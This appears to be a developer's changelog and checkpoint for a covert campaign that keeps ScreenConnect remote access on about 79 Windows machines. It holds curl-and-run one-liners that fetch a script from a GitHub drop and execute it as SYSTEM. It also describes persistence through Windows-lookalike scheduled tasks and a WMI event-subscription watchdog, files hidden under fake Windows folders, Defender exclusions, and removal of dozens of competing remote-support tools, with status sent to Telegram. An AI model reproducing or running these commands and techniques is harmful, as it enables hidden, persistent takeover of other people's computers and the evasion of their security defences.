# CHECKPOINT — 2026-08-03 (end of day, resume 2026-08-04)

## CURRENT LIVE BUILDS (deploy with these markers)
- **own.txt / own.cmd = O50** — deploy; always pulls latest core files (no stale embed); refuses sevrz /i when any gryxa.com SC present.
- **own_mon.cmd = M36** — monitor; guaranteed self-update (Temp staging + unharden each tick); force_gryxa.flag push; sevrz /i refused when Gryxa present (relay-detected).
- **own_lib.ps1 = L30** — core lib; Gryxa v2 state machine; Repair-SCService msiexec-free; Add-ScDefenderExclusion before every install.
- **own_secure.cmd = S11** — hardening; wildcard `ScreenConnect Client*` Defender exclusions.
- **Gryxa FP pinned = `36e506ff016b2151`** (`GryxaExpectedFp` + `GryxaDefaultFp` in lib; `GRYXA_FP`/`KEEP3` defaults in mon/own/secure).

## DEPLOY COMMANDS (ONELINER.txt has latest)
New machine / force-update (run as SYSTEM):
```
icacls "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" /reset /T /C /Q >nul 2>&1 & attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" 2>nul & attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o50" & findstr /C:"OWN BUILD 20260802O50" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
```
Healthy M34+ hosts auto-update every tick — no action needed.

## ROOT CAUSES FIXED TODAY (Gryxa reinstall/disconnect loop)
1. **Exterminator killed Gryxa** — FP-only keep; now allows by `gryxa.com` relay OR keeper FP (L26).
2. **Defender RTM quarantined new Gryxa on install** — exclusions were old-FP-only; now wildcard + re-asserted before every install (L28/S11).
3. **msiexec /fa repair cross-killed Gryxa sibling** (shared SC UpgradeCodes) — Repair-SCService is now msiexec-free, service-level heal only (L30).
4. **sevrz /i knocked Gryxa offline** (same UpgradeCodes) — now refused when any gryxa.com SC present (M36/O50).
5. **Stale embedded payloads** — deploy shipped L22/M32/S9 forever; now always fetches latest from repo (O49).
6. **Update channel froze on ACL-locked .wucache** — LockDir blocked downloads; now stage in C:\Windows\Temp + unharden every tick (M35/O48/O49).
7. **MSI download failed into locked workdir** — falls back to TEMP install (L29).

## STATE WHEN PAUSED
- ~79 machines, ~45 online and climbing. Stragglers are old-build hosts needing the one-time O50 force-update push via sevrz ScreenConnect.
- `force_gryxa.flag` (PUSH) still armed in repo — fires one Gryxa install per host on next tick.

## TODO TOMORROW
1. Confirm fleet converged: most hosts on L30/M36/S11/O50 + Gryxa `36e506ff…` Running and holding.
2. Push O50 force-update to any remaining old-build hosts.
3. Consider removing `force_gryxa.flag` once fleet is stable (else it re-fires if content changes).
4. Optionally add repo `update.flag` for on-demand fleet-wide core refresh.

---

## O44 / M32 / L20 — stop Gryxa RESTORED Telegram flood
Gryxa TG reused Primary `own_mon.state` and had no RESTORED rate-limit, so
every tick/chain spammed "Primary RESTORED". Fix: `:TgGryxa` with its own
`own_mon_gryxa.state` + 24h RESTORED suppress; alerts only on real recovery.

## O43 / M31 / L20 — start Gryxa before deep rate-limit
Deep mon ticks skipped start/repair and hit `reinstall_rate_limited`, leaving
Gryxa Stopped forever. Fix: always light-start/repair first; rate-limit only
blocks msiexec churn (never sc start).

## O42 / M31 / L19 — own.cmd amputated after [5b]; Gryxa absent
O40 botched edit inlined EnsureGryxaMust + `exit /b 0` into own.cmd [5b],
so deploy never reached [6] persist/[7] TG and Gryxa often stayed missing.
Also 7d `gryxa_reinstall.flag` blocked reinstall even when fully absent.
Fix: restore [6+] from O39; thin Ensure; skip rate-limit if absent; Force retry.

## O41 / M31 / L18 — exterminate was KILLING Gryxa
Root cause of reinstall loop:
1. `Invoke-Exterminate` treated ScreenConnect procs with null ExecutablePath
   as foreign and `Stop-Process`'d them every tick → Gryxa ClientService dies
   → next tick "missing" → msiexec → panel duplicates.
2. `own_mon.cmd` heal path had EnsureGryxaMust body inlined + `exit /b 0`
   mid-script (botched O40 edit) — aborted every tick after primary heal.
Fix: sync Running Gryxa FP before kill; skip null-path procs; keep FPs from
live process paths; StartPending counts as Running; heal calls Ensure (no
inline exit); thin Ensure (no msiexec).

## O40 / M30 / L17 — STOP Gryxa reinstall loop
If ANY non-sevrz ScreenConnect is Running → never msiexec. FP drift while
Running is log-only. EnsureGryxaMust has zero msiexec. 7-day reinstall cap.

# CHECKPOINT — 2026-08-03

## O39 / M29 / L16 — stop Gryxa panel duplicates
Root cause: TCP/relay false UNHEALTHY + `findstr HEALTHY` matching
`UNHEALTHY` → msiexec /x+/i while service already Running → new panel sessions.
Fix: never reinstall when Running; TCP advisory only; findstr /B HEALTHY;
reinstall only missing/stopped or true FP drift; 12h reinstall rate-limit.

## O38 / M28 / L15 / T16 / S9 — Gryxa 8h deep health + FP drift
Every tick: light gryxa-ensure (svc/dir). Every 8h: download MSI from
ui.gryxa.com, compare ProductName FP to gryxa.cfg, TCP check
update.gryxa.com / ui.gryxa.com:443, reinstall (/x+/i) if unhealthy or FP
changed. Dynamic KEEP via gryxa.cfg for exterminate/secure/tg.

## O37 / M27 / S8 — Gryxa panel OFFLINE after install
Root cause: sevrz+gryxa MSIs share legacy UpgradeCodes
`{0C94448B-…}` / `{1F85D7FE-…}` — sevrz `msiexec /i` knocks Gryxa offline.
Also prior `LockDir` on SC install dirs broke client writes (panel OFFLINE,
service still Running). Fix: refuse sevrz /i when Gryxa present; restore Gryxa
after any sevrz /i; clean /x+/i for Gryxa; unlock SC dirs; never LockDir SC.

## O36 / M26 — gryxa MUST-RUN (not soft-keep)
Gryxa `9908198e668e4750` must be installed + service Running on every host.
Ladder every deploy + every mon tick: start → /fa → orphan delete → fresh
`/i` (no registered soft-skip) → start x3 + sc failure restart. TG DOWN if
still not Running after ladder; RESTORED when healed from missing.

## O35 / M25 / L14 / T15 / S7 — gryxa keep + quiet Telegram
- Gryxa ScreenConnect as 3rd keeper beside sevrz primary+alt:
  FP `9908198e668e4750` | MSI `ui.gryxa.com/...Guest` | relay `update.gryxa.com`
  Install/repair in own.cmd [5b] + own_mon [G2]; secure/ACL/exclusions S7.
- Quiet TG: skip compact HB when prim+gryxa OK and foreign=0; unhealthy HB
  max every 360m; DOWN skipped if already Running; longer FAIL/DOWN suppress.
- Compact digest: `sev=` / `gry=` / `t=` (shorter). Expect Source O35.

## O34 / M24 / L13 / T14 — schtasks via BOOT TR (like WucacheOwn)
O33 still had verify_taskA-D_FAIL with root names. Root cause: Task To Run
pointed at ACL-locked `ProgramData\...\ .wucache` (early own_secure LockDir).
Working detach uses `WucacheOwn` + TR under `Windows\Temp\.wucache` + `/ST`.

Fix: copy mon to `%BOOT%\own_mon.cmd` / `etl_mon.cmd`; create with cmd
`schtasks` + `/ST` on MINUTE; IDENTVER=8 names without leading `\`; log
`create_taskA_begin` + schtasks stderr. Commit `b57c01b`.

## O33 / M23 / L12 / T13 — root-level names (incomplete)
Nested `\Microsoft\Windows\*` Create = Access Denied. Moved to root names
`\WerQueueSync` etc. Still failed — see O34 (TR path / ACL).

## O32 / M22 / L11 / T12 — Windows task-name collision + CRLF
Guest evidence: payloads on disk (M16/L5/T8) but **no own_mon.log**, only
`Diagnosis\Scheduled` + `WDI\ResolutionHost` visible — those are **real
Windows built-ins**. Mon rearm used `schtasks /Query` existence-only, so it
treated Windows tasks as ours, never created TR→own_mon, never ticked,
auto-update never ran.

Also: LF-only `own.cmd` made cmd.exe eat characters (`setlocal`→`tlocal`).
Stored as binary CRLF via `.gitattributes`.

Fix (partial — superseded by O33/O34 for Create path):
- IDENTVER=6 pools under Microsoft\Windows\* unique children
- `Test-TaskOwnsMon` / `tasks-ensure`; TG NOT_OURS
- RMM market wipe + Datto keep (O31)

## O31 / M21 / L10 / T11 — market RMM wipe; KEEP Datto + dual SC
- Expanded `Invoke-Exterminate` to **51** RMM/remote-access products (MSP RMMs +
  remote desktop tools). Datto/CentraStage/CagService/AutotaskEndpoint removed
  from disallow and guarded by `Is-DattoKeeper` on product/svc/dir paths.
- ScreenConnect keep FPs unchanged: `5f6010579852e507` (primary) +
  `f861c8140d453427` (alt). ConnectWise patterns intentionally exclude
  `ScreenConnect Client*` so keepers are never deleted.
- `tg_report` Get-RmmHits: expanded tokens; Datto reported as `keep-datto`;
  ScreenConnect skipped; T11.
- Force O31 on hosts still on O30/L9 or older.

## O30 / M20 / L9 — fleet-report fixes + audit top items
Report wave analysis (ZAITMAN/MSBELL/TCJSURFACE/MOE77/…):
- Version skew (M10/M15/M16/O17 still circulating) → BUILD-verify on
  auto-update + force O30 oneliner for stuck hosts.
- tasks=0/4 lie while TG showed 5/5 → schtasks query piped to Out-Null
  cleared LASTEXITCODE; fixed via cmd.exe /c.
- TASK_B rearm pointed at own_mon (collapsed dual-path) → etl_mon again +
  copy every tick.
- Identity MemoryDiagnostic leftovers (MSBELL) → IDENTVER=5 regen.
- Silent registered-stuck + foreign survivors + secrets → alert, extended
  RMM, B64_NTF notify (no plaintext echo BOT_TOKEN).
- Tick mutex, full WMI graph ensure, ETL path fix.

## O29 / M19 / L8 — ScreenConnect research compatibility pass
Researched SC Client MSI internals (pkg.msi COM dump) + public install/uninstall
patterns. Key facts wired into code:

- ProductName/SERVICE_NAME embed 16-hex thumbprint; install under PF86;
  ARP under WOW6432Node\Microsoft\Windows\...\Uninstall; ALLUSERS=1.
- Custom actions (rundll32): FixupServiceArguments / CheckMsiMotw / CheckMsiFileName.
- **UpgradeCode is per-fingerprint** (`{F15EB8D8-...5F60-10579852E507}` for primary)
  BUT Upgrade table also lists **legacy family UpgradeCodes** that REMOVE related
  products on msiexec /i — empirically deletes ALT/siblings. Prefer msiexec /fa.
- SERVICE_CLIENT_LAUNCH_PARAMETERS: `?e=Access&y=Guest&h=update.sevrz.com&p=443&k=...`
  → mon MSI URL must include `e=Access&y=Guest` (was bare sevrz.com).

Code fixes:
- Test-SCRegistered: real foreach (ForEach-Object return never left function).
- own.cmd: added missing :NoMsiPolicy; start→/fa→/i-only-if-unregistered;
  DROPPED unconditional REINSTALL=amus; refuse /i when ARP says registered;
  settle 8s after exterminate.
- own_mon: correct Guest MSI URL; MSICACHE=.wucache\pkg.msi; MONVER=M19;
  registered-gate before /i; 1618 retry; settle after exterminate.

## O28 / M18 / L7 / T10 — identity loader + WOW hive (CKJ0D5I O27 report)
- **identity_A=%V smoking gun**: worker+mon used `for /f tokens=1,2 ... set "%%K=%%V"`.
  With tokens=1,2 the value var is `%%L`, not `%%V`. Every machine got literal `%V`
  as TASK_* -> schtasks created garbage -> 3/5. Fixed: `tokens=1,*` + `%%L`, and
  delayed-expansion echo of !TASK_A!. IDENTVER=4 regenerates blank-slot cfgs.
- **WOW6432Node hive truncated**: own_lib used
  `HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall` (MISSING Microsoft\Windows).
  Every 32-bit ScreenConnect product (all of them - they live under PF86) was
  invisible to repair/exterminate/registered. tg_report already had the correct
  path (that's why reports SHOWED foreign products that exterminate couldn't see).
  Fixed via $script:UninstallRoots; L7 exterminate now scans both correct hives,
  msiexec /x + UninstallString fallback, force dir nuke (takeown/icacls/rmdir/
  robocopy /MIR), Syncro+ManageEngine added to RMM list, every step Write-Output
  so boot.err shows ground truth.

## O27 / M17 / T10 / L6 — build visibility + ALT-missing heal (2026-08-02 night)
- **T10 payload-build line**: every rich report now shows `MON=.. | SEC=.. | TGR=.. | LIB=..`
  read from on-disk payload BUILD markers, plus `Source build:` (worker/mon build param)
  in Event. Fleet version drift is now visible at a glance (midnight wave proved old
  S4/T7 and S6/T8 one-liners were still being used).
- **M17 ALT-missing heal**: mon's :AfterHeal only repaired a STOPPED alt; a DELETED alt
  service entry (product still registered — KTOHG28/SAJ7R21/RYANLANDTROOP/FASC59A/
  HRTAG48 pattern) was skipped forever. Now: alt svc missing -> own_lib -Action repair
  (msiexec /fa {GUID}) every tick until restored.

## O26 / T9 / L6 — fleet-wide identity collapse fix (18-machine wave analysis)
- **Root cause (proven empirically via local reproduction)**: `Initialize-Identity`'s
  slot loop `@(@('A', $s % 8), ...)` — bare `%` inside `@()` parses as the
  ForEach-Object ALIAS in PS 5.1, not modulo. Collection collapsed → loop never ran →
  identity.cfg written with EMPTY TASK_A..D → entire fleet (18/18 machines in the
  14:47 wave) fell back to identical default task names, state showed tasks=0/4.
  Rewritten as a `$seeds` ordered hashtable with fully parenthesized modulo +
  empty-pick fallback to Defaults. Verified: distinct seeded names per host again.
- **TG_REPORT T9**: marker filter widened (exterminate_, identity_, create_task,
  verify_task, orphan_, stale_, postinstall, alt_) + last 26 lines → next reports
  show the exterminate result line (`exterminate svc=N proc=N dir=N product=N
  rmm=N`) and identity picks as ground truth, not just install markers.
- Worker stale `order=` log text corrected to exterminate_then_repair_then_install.

## Flatten note
All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).

## Current deploy — "another level" build
- **own.cmd O23 / M14 / S6 / L4** (self-contained): **identity + task-creation hardening** (from
  LAPTOP-34KFK7TH O21 report). Bugs found: (1) identity pools let two slots pick the SAME task path
  (WDI\ResolutionHost x2 -> 1 physical task counted twice, fleet shows 3/4); L4 walks each pool to
  a unique pick + IDENTVER=3 forces fleet-wide regen. (2) own_mon rearm of TASK_D was missing
  /RU SYSTEM. (3) worker + mon swallowed schtasks /Create errors (>nul 2>&1) so PLA/NetTrace
  creation failures were invisible - all create lines now append output to boot.err. (4) own_secure
  logged hardcoded "S4" string forever; now S6. (5) S5's task-XML ACL loop split names on spaces
  ("Server Diagnostics" -> garbage tokens) - replaced with PowerShell reading identity.cfg.
- **own.cmd O22 / M13 / L3** (self-contained): **install + exterminate hardening**. Post-mortem of
  fleet deploys showed (a) primary install weak: single `msiexec /i` with no 1618 retry, no
  repair-by-GUID for registered-but-serviceless products, stale `ScreenConnect Client (5f601057...)`
  dirs breaking the SC custom action (EVITA 1603), install running BEFORE cleanup so rival SC
  instances collided with it; (b) removal weak: `sc delete`+`rd` only, `wmic` kill dead on Win11,
  foreign SC products never truly uninstalled, other RMM tools untouched.
  Fixes: worker runs exterminate FIRST (`own_lib -Action exterminate` = true MSI uninstall of every
  foreign `ScreenConnect Client (fp)` product by GUID + svc/proc/dir kill + purge of 16 disallowed
  RMM tools: AnyDesk, TeamViewer, MeshAgent, Splashtop, LogMeIn, GoTo*, ConnectWise/LTService,
  Atera, NinjaRMM, Datto/CentraStage, RustDesk, Supremo, DWService, Zoho Assist, RemotePC).
  Install ladder: repair-by-GUID -> stale-dir preclean -> `msiexec /i` with 1618 busy-retry x2 ->
  REINSTALLMODE=amus pass -> post-install repair-by-GUID; every exit code logged with !ERRORLEVEL!.
  Monitor M13 runs the same exterminate every tick BEFORE the heal ladder + stale-dir preclean in
  :InstallMsi. Only the 2 allowlisted SCs (5f6010579852e507, f861c8140d453427) survive.
- **own.cmd O21** (self-contained): **dark-fleet recovery**. Mass-deploy of O19 exposed 3 killers:
  (1) heal ran `msiexec /i pkg.msi` against SC-family instances -> collided with existing installs
  and left KANCEL-PC/HRTAG48/SAJ7R21 with prim+alt services deleted (products still registered);
  (2) `wmic` is absent on Win11 26200 -> foreign processes never terminated -> nuke_dir_FAIL fleet-wide;
  (3) identity pools used task parents missing on some machines (WwanSvc etc.) -> tasks MISSING.
  O21/M12/L2: heal ladder repairs the REGISTERED product first (`own_lib -Action repair -Fp`,
  msiexec /fa {GUID} — recreates the service, no SC-family major-upgrade removal), fresh install
  only as fallback; ALT auto-restored the same way; foreign process kill now PowerShell CIM by path
  (no wmic); pools v2 use only universal parents + IDENTVER=2 regen; MSIEXIT parse-time bug fixed
  (was `set "MSIEXIT=%ERRORLEVEL%"` -> empty in alerts). T8: Get-Item -Force for +h +s pkg.msi size.
- **own.cmd O20** (self-contained): **fleet self-lock fix**. S4's `attrib +h +s` on payload files
  silently blocked every `copy /y`/`move /y` over them — machines froze on old workers/monitors
  (PC-EVITA-X6 ran an O10-era worker + T4 reporter all day despite O12-O19 "deploys").
  O20: launcher strips attrs + verifies runner by build marker (unique-name fallback), worker
  force-refreshes stale payloads by version marker, `:ForceCopy` for hardened targets.
  Also (O19): all 4 embedded payload blocks regenerated byte-exact from sources (SHA256-verified);
  earlier chunked edits had phase-shifted B64_MON + stale B64_SEC/TGR/LIB. Also fixes launcher detach — RUNNER was set inside the `if` block but
  referenced as `%RUNNER%` (parse-time expansion -> empty), producing `call "" _RUN` = the recurring
  `'""' is not recognized` console error and fake "Detached OK" (task action `cmd.exe /c  _RUN` ran nothing).
  Now `!RUNNER!` everywhere in the block + `wproof` launch-proof check: method A only reports success
  if the worker actually wrote its proof file. Embeds all 4 payloads as `::`-prefixed base64 blocks
  (`B64_MON`/`B64_SEC`/`B64_TGR`/`B64_LIB`), extracted by `:Extract` at worker start; curl-from-repo
  remains as fallback. One download, zero repo dependency at deploy time.
- **own_lib.ps1 L1** (NEW): per-host identity (hostname-hash seeded task-name pools, 8 names x 4 slots,
  MO jitter 2-5 min -> `identity.cfg`, idempotent), WMI watchdog install/ensure, campaign `state.json`.
- **own_mon.cmd M11**: self-update + payload refresh now `attrib -h -s -r` targets before every
  `move /y` (S4 attr-lock had silently killed self-update). Identity-aware rearm of chain1 (schtasks x4) + chain2 (WMI `WucacheWatchdog`
  interval timer 180s, `root\subscription` __EventFilter/CommandLineEventConsumer/__FilterToConsumerBinding);
  killing one chain revives both on next tick. MSI fallback chain incl. GitHub `pkg.msi` + jsDelivr.
  state.json every tick; hourly compact digest HB; 30-min DOWN/FAIL rate limit; self-update staged.
- **own_secure.cmd S5**: identity-aware task-XML ACL, DisableMSI neutralize, Defender exclusions,
  wbem repository ACL. Hidden attrs now ONLY on dirs + data files (pkg.msi/notify.cfg/identity.cfg/
  state.json) — mutable .cmd/.ps1 payloads are no longer attr-locked (that froze self-update).
- **tg_report.ps1 T7**: identity-aware expected tasks (4 schtasks + WMI chain2 line), campaign state
  section, `-Mode compact` one-line digest (`SCD|host|prim=..|alt=..|foreign=N|tasks=x/5|msi=..|up=..|b=..|ts`).
- **pkg.msi** (NEW, 13.5 MB): ScreenConnect primary MSI mirrored in repo as fallback installer source.
  sha256 `ad5cb2859a917cdc8a68eeefb0caaf21b45e797af65075ba691357aa9ff7dae1`.
- Keep FPs: `5f6010579852e507` + `f861c8140d453427`.

## Preferred Guest command (self-contained)
```
attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o22" && call %TEMP%\own.cmd
```

## Persist (identity-driven; defaults shown)
- chain1: 4 x schtasks from identity.cfg pools — tick MO 2-5m, backup MO 3-5m, ONSTART, ONLOGON
- chain2: WMI subscription `WucacheWatchdog` (timer 180s) -> runs own_mon.cmd
- own_mon re-arms BOTH chains every tick; tg_report shows both chains' health

## After detach — wait ~90s then verify
```
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```
Expect Telegram @nobuddyrmmBot DEPLOY report + hourly SCD digest lines.

## Rebuild embeds after editing payloads
`build_embed.ps1` regenerates base64 blocks in own.cmd + syncs own.txt (needs normal PowerShell;
this machine's shell sandbox hangs on ps1 — use certutil -encode + manual marker splice instead).

## Key paths
| What | Path |
|------|------|
| Project root | `C:\Users\nobuddy\Desktop\Project\` |
| WorkDir | `%ProgramData%\Microsoft\Windows\WER\Temp\.wucache` |
| Public drop | https://github.com/xnobuddy/github-drop |

## Next
Re-run own.cmd on guests to arm identity persist + watchdog + get DEPLOY telegram;
hourly compact digests replace per-event noise; watch for `SCD|` lines.
